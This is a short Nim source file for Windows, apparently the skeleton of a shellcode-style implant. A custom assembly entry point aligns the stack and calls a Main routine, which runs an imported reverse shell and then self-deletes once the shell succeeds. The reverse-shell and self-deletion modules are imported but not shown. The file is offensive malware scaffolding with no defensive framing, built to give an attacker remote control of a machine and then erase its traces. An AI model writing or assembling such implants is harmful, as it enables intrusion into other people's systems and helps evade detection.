import winim

import reverse_shell, self_delete

proc main() {.exportc: "Main".} =
  if reverseShell() == true:
    discard deleteSelf()

proc start() {.asmNoStackframe, codegenDecl: "__attribute__((section (\".text\"))) $# $#$#", exportc: "start".} =
  asm """
    and rsp, 0xfffffffffffffff0
    sub rsp, 0x10
    call Main
    add rsp, 0x10
    ret
  """

when isMainModule:
  start()